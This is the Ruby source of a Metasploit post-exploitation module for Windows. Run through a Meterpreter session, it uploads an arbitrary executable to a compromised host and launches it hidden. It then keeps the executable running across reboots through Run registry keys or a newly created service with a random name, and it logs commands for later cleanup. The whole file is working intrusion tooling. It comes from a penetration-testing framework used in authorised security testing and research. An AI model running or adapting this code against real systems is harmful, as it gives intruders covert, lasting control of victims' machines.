##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'Windows Manage Persistent EXE Payload Installer',
                      'Description'   => %q(
                            This Module will upload an executable to a remote host and make it Persistent.
                            It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login,
                            SYSTEM will start on system boot but requires privs. SERVICE will create a new service
                            which will start the payload. Again requires privs.
                                             ),
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Merlyn drforbin Cousins <drforbin6[at]gmail.com>' ],
                      'Version'       => '$Revision:1$',
                      'Platform'      => [ 'windows' ],
                      'SessionTypes'  => [ 'meterpreter']))

    register_options(
      [
        OptEnum.new('STARTUP', [true, 'Startup type for the persistent payload.', 'USER', ['USER', 'SYSTEM', 'SERVICE']]),
        OptPath.new('REXEPATH', [true, 'The remote executable to upload and execute.']),
        OptString.new('REXENAME', [true, 'The name to call exe on remote system', 'default.exe'])
      ], self.class
    )

    register_advanced_options(
      [
        OptString.new('LocalExePath', [false, 'The local exe path to run. Use temp directory as default. ']),
        OptString.new('StartupName',   [false, 'The name of service or registry. Random string as default.' ]),
        OptString.new('ServiceDescription',   [false, 'The description of service. Random string as default.' ])
      ])

  end

  # Run Method for when run command is issued
  #-------------------------------------------------------------------------------
  def run
    print_status("Running module against #{sysinfo['Computer']}")

    # Set vars
    rexe = datastore['REXEPATH']
    rexename = datastore['REXENAME']
    host, _port = session.tunnel_peer.split(':')
    @clean_up_rc = ""

    raw = create_payload_from_file rexe

    # Write script to %TEMP% on target
    script_on_target = write_exe_to_target(raw, rexename)

    # Initial execution of script
    target_exec(script_on_target)

    case datastore['STARTUP']
    when /USER/i
      write_to_reg("HKCU", script_on_target)
    when /SYSTEM/i
      write_to_reg("HKLM", script_on_target)
    when /SERVICE/i
      install_as_service(script_on_target)
    end

    clean_rc = log_file
    file_local_write(clean_rc, @clean_up_rc)
    print_status("Cleanup Meterpreter RC File: #{clean_rc}")

    report_note(host: host,
                type: "host.persistance.cleanup",
                data: {
                  local_id: session.sid,
                  stype: session.type,
                  desc: session.info,
                  platform: session.platform,
                  via_payload: session.via_payload,
                  via_exploit: session.via_exploit,
                  created_at: Time.now.utc,
                  commands: @clean_up_rc
                })
  end

  # Function for creating log folder and returning log path
  #-------------------------------------------------------------------------------
  def log_file(log_path = nil)
    # Get hostname
    host = session.sys.config.sysinfo["Computer"]

    # Create Filename info to be appended to downloaded files
    filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

    # Create a directory for the logs
    logs = if log_path
             ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))
           else
             ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))
           end

    # Create the log directory
    ::FileUtils.mkdir_p(logs)

    # logfile name
    logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
    logfile
  end

  # Function to execute script on target and return the PID of the process
  #-------------------------------------------------------------------------------
  def target_exec(script_on_target)
    print_status("Executing script #{script_on_target}")
    proc = session.sys.process.execute(script_on_target, nil, 'Hidden' => true)
    print_good("Agent executed with PID #{proc.pid}")
    @clean_up_rc << "kill #{proc.pid}\n"
    proc.pid
  end

  # Function to install payload in to the registry HKLM or HKCU
  #-------------------------------------------------------------------------------
  def write_to_reg(key, script_on_target)
    nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8) + 8)
    print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
    if key
      registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", nam, script_on_target, "REG_SZ")
      print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
      @clean_up_rc << "reg deleteval -k '#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -v '#{nam}'\n"
    else
      print_error("Error: failed to open the registry key for writing")
    end
  end

  # Function to install payload as a service
  #-------------------------------------------------------------------------------
  def install_as_service(script_on_target)
    if  is_system? || is_admin?
      print_status("Installing as service..")
      nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8) + 8)
      description = datastore['ServiceDescription'] || Rex::Text.rand_text_alpha(8)
      print_status("Creating service #{nam}")

      key = service_create(nam, :path=>"cmd /c \"#{script_on_target}\"",:display=>description)

      # check if service had been created
      if key != 0
        print_error("Service #{nam} creating failed.")
        return
      end

      # if service is stopped, then start it.
      service_start(nam) if service_status(nam)[:state] == 1

      @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
    else
      print_error("Insufficient privileges to create service")
    end
  end

  # Function for writing executable to target host
  #-------------------------------------------------------------------------------
  def write_exe_to_target(rexe, rexename)
    # check if we have write permission
    # I made it by myself because the function filestat.writable? was not implemented yet.
    if not datastore['LocalExePath'].nil?

      begin
        temprexe = datastore['LocalExePath'] + "\\" + rexename
        write_file_to_target(temprexe,rexe)
      rescue Rex::Post::Meterpreter::RequestError
        print_warning("Insufficient privileges to write in #{datastore['LocalExePath']}, writing to %TEMP%")
        temprexe = session.sys.config.getenv('TEMP') + "\\" + rexename
        write_file_to_target(temprexe,rexe)
      end

    # Write to %temp% directory if not set LocalExePath
    else
      temprexe = session.sys.config.getenv('TEMP') + "\\" + rexename
      write_file_to_target(temprexe,rexe)
    end

    print_good("Persistent Script written to #{temprexe}")
    @clean_up_rc << "rm #{temprexe.gsub("\\", "\\\\\\\\")}\n"
    temprexe
  end

  def write_file_to_target(temprexe,rexe)
    fd = session.fs.file.new(temprexe, "wb")
    fd.write(rexe)
    fd.close
  end

  # Function to create executable from a file
  #-------------------------------------------------------------------------------
  def create_payload_from_file(exec)
    print_status("Reading Payload from file #{exec}")
    ::IO.read(exec)
  end
end
